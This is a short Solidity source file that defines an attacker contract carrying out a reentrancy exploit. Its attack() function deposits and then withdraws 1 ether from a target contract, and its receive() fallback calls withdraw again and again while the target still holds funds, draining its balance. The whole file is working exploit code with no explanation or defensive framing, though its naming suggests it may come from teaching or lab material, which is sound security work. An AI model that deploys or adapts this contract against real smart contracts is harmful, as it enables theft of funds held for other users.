// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IVulnerableContract {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

contract AttackerContract {
    IVulnerableContract public vulnerableContract;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = IVulnerableContract(_vulnerableContractAddress);
    }

    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Send more ETH");
        vulnerableContract.deposit{ value: ATTACK_AMOUNT }();
        vulnerableContract.withdraw(ATTACK_AMOUNT);
    }

    receive() external payable {
        if (address(vulnerableContract).balance >= ATTACK_AMOUNT) {
            vulnerableContract.withdraw(ATTACK_AMOUNT);
        }
    }
}
